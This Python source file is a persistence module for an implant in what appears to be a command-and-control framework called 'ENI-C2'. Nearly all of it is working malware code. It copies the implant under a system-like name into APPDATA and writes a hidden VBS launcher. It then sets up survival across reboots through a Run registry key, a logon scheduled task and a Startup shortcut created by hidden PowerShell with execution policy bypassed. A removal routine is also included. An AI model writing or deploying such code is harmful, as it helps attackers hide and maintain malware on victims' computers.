"""
ENI-C2 Persistence Module
Multiple persistence mechanisms for implant survivability.
"""

import os
import sys
import shutil
import subprocess
import winreg
from pathlib import Path
from typing import Optional


class Persistence:
    """Establish and manage implant persistence."""
    
    IMPLANT_NAME = "WindowsServiceHost.exe"
    REG_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
    REG_VALUE = "WindowsServiceHost"
    
    @staticmethod
    def _get_install_path() -> Path:
        """Determine install location."""
        if sys.platform == "win32":
            return Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Services"
        return Path.home() / ".local" / "services"
    
    @classmethod
    def install_current(cls) -> Optional[str]:
        """Copy implant to persistent location and set up autorun."""
        install_dir = cls._get_install_path()
        install_dir.mkdir(parents=True, exist_ok=True)
        implant_path = install_dir / cls.IMPLANT_NAME
        
        try:
            # Copy current executable
            if getattr(sys, "frozen", False):
                # Running as compiled executable
                shutil.copy2(sys.executable, implant_path)
            else:
                # Running as script — copy and set up python wrapper
                wrapper = install_dir / "service_host.pyw"
                shutil.copy2(sys.argv[0], wrapper)
                # Create VBS launcher (no console window)
                vbs = install_dir / "service_host.vbs"
                vbs.write_text(
                    f'Set objShell = CreateObject("WScript.Shell")\n'
                    f'objShell.Run "pythonw.exe ""{wrapper}""", 0, False'
                )
                implant_path = vbs
            
            return str(implant_path)
        except Exception as e:
            return None
    
    @classmethod
    def registry_autorun(cls, exe_path: Optional[str] = None) -> bool:
        """Add to HKCU Run key for logon persistence."""
        if not exe_path:
            exe_path = str(cls._get_install_path() / cls.IMPLANT_NAME)
        
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                cls.REG_KEY,
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, cls.REG_VALUE, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            return True
        except Exception:
            return False
    
    @classmethod
    def scheduled_task(cls, exe_path: Optional[str] = None) -> bool:
        """Create scheduled task for persistence (survives reboots)."""
        if not exe_path:
            exe_path = str(cls._get_install_path() / cls.IMPLANT_NAME)
        
        cmd = (
            f'schtasks /create /tn "WindowsServiceHost" /tr "{exe_path}" '
            f'/sc onlogon /rl limited /f'
        )
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, timeout=10
            )
            return result.returncode == 0
        except Exception:
            return False
    
    @classmethod
    def startup_folder(cls, exe_path: Optional[str] = None) -> bool:
        """Drop shortcut in Windows Startup folder."""
        if not exe_path:
            exe_path = str(cls._get_install_path() / cls.IMPLANT_NAME)
        
        startup = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        shortcut = startup / "WindowsServiceHost.lnk"
        
        try:
            # Use PowerShell to create shortcut
            ps_script = f'''
            $ws = New-Object -ComObject WScript.Shell
            $sc = $ws.CreateShortcut("{shortcut}")
            $sc.TargetPath = "{exe_path}"
            $sc.WindowStyle = 7
            $sc.Save()
            '''
            subprocess.run(
                ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-c", ps_script],
                capture_output=True, timeout=10
            )
            return shortcut.exists()
        except Exception:
            return False
    
    @classmethod
    def install_all(cls) -> dict:
        """Apply all persistence mechanisms."""
        exe_path = cls.install_current()
        if not exe_path:
            return {"error": "Failed to install implant"}
        
        results = {
            "registry": cls.registry_autorun(exe_path),
            "scheduled_task": cls.scheduled_task(exe_path),
            "startup_folder": cls.startup_folder(exe_path),
        }
        results["success"] = all(results.values())
        return results
    
    @classmethod
    def remove_all(cls) -> dict:
        """Remove all persistence."""
        results = {}
        
        # Registry
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, cls.REG_KEY, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, cls.REG_VALUE)
            winreg.CloseKey(key)
            results["registry"] = True
        except Exception:
            results["registry"] = False
        
        # Scheduled task
        try:
            subprocess.run('schtasks /delete /tn "WindowsServiceHost" /f', shell=True, capture_output=True)
            results["scheduled_task"] = True
        except Exception:
            results["scheduled_task"] = False
        
        # Startup folder
        startup = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        shortcut = startup / "WindowsServiceHost.lnk"
        try:
            shortcut.unlink(missing_ok=True)
            results["startup_folder"] = True
        except Exception:
            results["startup_folder"] = False
        
        # Installed files
        try:
            shutil.rmtree(cls._get_install_path(), ignore_errors=True)
            results["files"] = True
        except Exception:
            results["files"] = False
        
        return results